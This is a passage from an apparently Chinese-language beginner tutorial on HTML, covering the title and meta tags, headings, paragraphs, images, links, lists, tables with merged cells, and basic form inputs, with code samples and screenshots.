class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        冰冰邦邦~</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="title标签："><a href="#title标签：" class="headerlink" title="title标签："></a>title标签：</h3><p>可定义文章的标题</p><p>它显示在浏览器窗口的标题栏或状态栏上</p><p><code>&lt;title&gt;</code>标签是<code>&lt;head&gt;</code>标签中唯一必须要求包含的东西，也就是说，写head一定要写title</p><p><code>&lt;title&gt;</code>的增加有利于SEO优化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SEO是搜索引擎优化的英文缩写，通过对网站内容调整，满足搜索引擎的排名需求</span><br></pre></td></tr></table></figure><h3 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h3><p>meta标签用来描述一个HTML网页文档的属性，关键词等，例如：charset=“utf-8”是说当前使用的是utf-8编码格式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>冰冰邦邦<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        冰冰邦邦！！！！</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h2><h3 id="标题介绍与应用"><a href="#标题介绍与应用" class="headerlink" title="标题介绍与应用"></a>标题介绍与应用</h3><p>标题是通过<code>&lt;h1&gt;&lt;h6&gt;</code>标签进行定义的</p><p><code>&lt;h1&gt;</code>定义最大的标题，<code>&lt;h6&gt;</code>定义最小的标题</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>一级标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>二级标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>三级标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>四级标题<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>五级标题<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>六级标题<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="标题标签的位置摆放："><a href="#标题标签的位置摆放：" class="headerlink" title="标题标签的位置摆放："></a>标题标签的位置摆放：</h3><p>在标签中添加属性<code>align=&quot;left|center|right&quot;</code>来改变位置。默认居左：</p><p><img src="https://pic1.imgdb.cn/item/67c962cd066befcec6df0049.png" alt=""></p><h2 id="段落标签"><a href="#段落标签" class="headerlink" title="段落标签"></a>段落标签</h2><h3 id="段落："><a href="#段落：" class="headerlink" title="段落："></a>段落：</h3><p>段落通过<code>&lt;p&gt;</code>标签来定义。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是另一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="换行："><a href="#换行：" class="headerlink" title="换行："></a>换行：</h3><p>如果在不产生一个新段落的情况下进行换行，使用<code>&lt;br&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>hhhh<span class="tag">&lt;<span class="name">br</span>&gt;</span>aaaa<span class="tag">&lt;<span class="name">br</span>&gt;</span>hhhh<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67c963e1066befcec6df0335.png" alt=""></p><h3 id="水平线："><a href="#水平线：" class="headerlink" title="水平线："></a>水平线：</h3><p><code>&lt;hr&gt;</code>标签在HTML页面中创建水平线</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">hr</span> <span class="attr">color</span>=<span class="string">&quot;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;&quot;</span> <span class="attr">size</span>=<span class="string">&quot;&quot;</span> <span class="attr">align</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>属性：</p><p>color：设置水平线颜色</p><p>width：设置水平线长度</p><p>size：设置水平线高度</p><p>align：设置水平线对齐方式（默认居中），可取值（left|right）</p><p><img src="https://pic1.imgdb.cn/item/67c96514066befcec6df05a4.png" alt=""></p><h2 id="图片标签："><a href="#图片标签：" class="headerlink" title="图片标签："></a>图片标签：</h2><p><code>&lt;img&gt;</code>标签定义HTML页面中的图像</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;&quot;</span> <span class="attr">height</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：<code>&lt;img&gt;</code> 是单标签，不需要进行闭合操作。</p><p>属性：</p><p>src：路径（图片地址与名字）</p><p>alt：规定图像的替代文本</p><p>width：规定图像的宽度</p><p>height：规定图像的高度</p><p>title：鼠标悬停在图片上给予提示</p><h2 id="超文本链接标签："><a href="#超文本链接标签：" class="headerlink" title="超文本链接标签："></a>超文本链接标签：</h2><p>HTML使用标签<code>&lt;a&gt;</code>来设置超文本链接</p><p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，点击这些内容来跳转到新的文档或者当前文档中的某个部分</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;url&quot;</span>&gt;</span>链接文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67c96c62066befcec6df11a3.png" alt=""></p><h3 id="超链接属性："><a href="#超链接属性：" class="headerlink" title="超链接属性："></a>超链接属性：</h3><p>默认情况下，链接将以以下形式出现在浏览器中：</p><ol><li>一个未访问过的链接显示为蓝色字体并带有下划线</li><li>访问过的链接显示为紫色并带有下划线</li><li>点击链接时，链接显示为红色并带有下划线。</li></ol><h2 id="文本标签："><a href="#文本标签：" class="headerlink" title="文本标签："></a>文本标签：</h2><h3 id="常用文本标签："><a href="#常用文本标签：" class="headerlink" title="常用文本标签："></a>常用文本标签：</h3><div class="table-container"><table><thead><tr><th style="text-align:center">标签</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>&lt;em&gt;</code></td><td style="text-align:center">定义着重文字</td></tr><tr><td style="text-align:center"><code>&lt;b&gt;</code></td><td style="text-align:center">定义粗体文字</td></tr><tr><td style="text-align:center"><code>&lt;i&gt;</code></td><td style="text-align:center">定义斜体字</td></tr><tr><td style="text-align:center"><code>&lt;strong&gt;</code></td><td style="text-align:center">定义加重语气</td></tr><tr><td style="text-align:center"><code>&lt;del&gt;</code></td><td style="text-align:center">定义删除字</td></tr><tr><td style="text-align:center"><code>&lt;span&gt;</code></td><td style="text-align:center">元素没有特定的含义</td></tr></tbody></table></div><p><strong>提示：</strong>常用文本标签和段落是不同的，段落表示一段文本，而文本标签一般表示文本词汇</p><p><img src="https://pic1.imgdb.cn/item/67c96dc7066befcec6df1495.png" alt=""></p><h2 id="列表标签"><a href="#列表标签" class="headerlink" title="列表标签"></a>列表标签</h2><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>有序列表是一列项目，列表项目使用数字进行标记。有序列表始于<code>&lt;ol&gt;</code>标签。每个列表项始于<code>&lt;li&gt;</code>标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>冰冰<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>邦邦<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67c96f9e066befcec6df159a.png" alt=""></p><p><code>&lt;ol&gt;</code> 的属性type拥有的选项：</p><p>1：表示列表项目用数字标号（1，2，3…）</p><p>a：表示列表项目用小写字母标号（a，b，c…）</p><p>A：表示列表项目用大写字母标号（A，B，C…）</p><p>i：表示列表项目用小写罗马字母标号（i，ii，iii…）</p><p>I：表示列表项目用大写罗马字母标号（I，II，III…）</p><p><img src="https://pic1.imgdb.cn/item/67cec783066befcec6e2749a.png" alt=""></p><h3 id="有序列表嵌套"><a href="#有序列表嵌套" class="headerlink" title="有序列表嵌套"></a>有序列表嵌套</h3><p>列表可以进行嵌套：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>冰冰邦邦1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>haha<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>papa<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>yyyyyy<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67cec82e066befcec6e274c2.png" alt=""></p><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>无序列表是一个项目的列表，此列表使用粗体圆点进行标记</p><p>无序列表始于<code>&lt;ul&gt;</code>标签，每个列表项始于<code>&lt;li&gt;</code>标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>hhh<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67ceca19066befcec6e2753a.png" alt=""></p><p><code>&lt;ul&gt;</code>的属性type拥有的选项：</p><p>disc 默认实心圆</p><p>circle 空心圆</p><p>square 小方块</p><p>none 不显示</p><h3 id="无序列表嵌套"><a href="#无序列表嵌套" class="headerlink" title="无序列表嵌套"></a>无序列表嵌套</h3><p>无序列表也可以进行嵌套：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>aaaa<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>bbbb<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>cccc<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>dddd<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67cecb48066befcec6e27585.png" alt=""></p><p>快捷键：</p><p>快速生成ul+li的布局： ul&gt;li*3</p><h2 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h2><p>表格：<code>&lt;table&gt;</code></p><p>行：<code>&lt;tr&gt;</code></p><p>单元格（列）：<code>&lt;td&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>ddd<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>快捷键：</p><p>快速生成表格结构： table&gt;tr*2&gt;td{单元格}</p><p><strong>表格属性：</strong></p><p>border：设置表格边框</p><p>width：设置表格宽度</p><p>height：设置表格高度</p><p><img src="https://pic1.imgdb.cn/item/67cecf88066befcec6e27637.png" alt=""></p><h3 id="单元格合并"><a href="#单元格合并" class="headerlink" title="单元格合并"></a>单元格合并</h3><p><strong>水平合并：</strong>colspan</p><p><strong>垂直合并：</strong>rowspan</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>合并单元格6，7: colspan<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>合并单元格15，20: rowspan<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">P</span>&gt;</span>水平合并：保留左边，删除右边<span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>垂直合并：保留上面，删除下面<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格4<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格5<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>单元格6单元格7<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格8<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格9<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格10<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格11<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格12<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格13<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格14<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>单元格15单元格20<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格16<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格17<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格18<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格19<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格21<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格22<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格23<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格24<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格25<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Form表单"><a href="#Form表单" class="headerlink" title="Form表单"></a>Form表单</h2><p>表单在Web网页中用来给用户填写信息，从而能够采集用户信息，使网页具有交互的功能</p><p>所有的用户输入内容的地方都用表单来写，如登录注册，搜索框</p><p>只要有用户输入的地方一定会有表单</p><p><strong>表单由容器和控件组成</strong>，一个表单一般应该包含用户填写的输入框，提交按钮等，这些输入框，按钮叫做控件，表单就是容器，它能够容纳各种各样的控件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#x27;url&#x27;</span> <span class="attr">method</span>=<span class="string">&quot;get|post&quot;</span> <span class="attr">name</span>=<span class="string">&quot;myform&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="属性说明："><a href="#属性说明：" class="headerlink" title="属性说明："></a>属性说明：</h3><p><code>action</code>：服务器地址</p><p><code>name</code>：表单名称</p><p><code>method</code>：数据提交方式</p><h3 id="表单元素："><a href="#表单元素：" class="headerlink" title="表单元素："></a>表单元素：</h3><p>一个完整的表单由三个基本部分组成：表单标签，表单域，表单按钮</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;url&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d2f08e88c538a9b5bc8b98.png" alt=""></p><h4 id="文本框："><a href="#文本框：" class="headerlink" title="文本框："></a>文本框：</h4><p>文本域通过<code>&lt;input type=&quot;text&quot;&gt;</code>标签来设定，当用户要在表单中键入字符数字等内容时，就会用到文本域</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="密码框："><a href="#密码框：" class="headerlink" title="密码框："></a>密码框：</h4><p>密码字段通过标签<code>&lt;input type=&quot;password&quot;&gt;</code>来定义</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>密码字段不会明文显示，而是星号或者圆点来代替。</p><p><img src="https://pic1.imgdb.cn/item/67d2f2b588c538a9b5bc8bfd.png" alt=""></p><h4 id="提交按钮："><a href="#提交按钮：" class="headerlink" title="提交按钮："></a>提交按钮：</h4><p>当用户单击确认按钮时，表单的内容会被传送到另一个文件，表单的动作属性定义了目的文件的文件名。由动作属性定义的这个文件通常会对接收到的数据进行相关的处理。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">action</span>=<span class="string">&quot;url&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">    Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登陆&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img 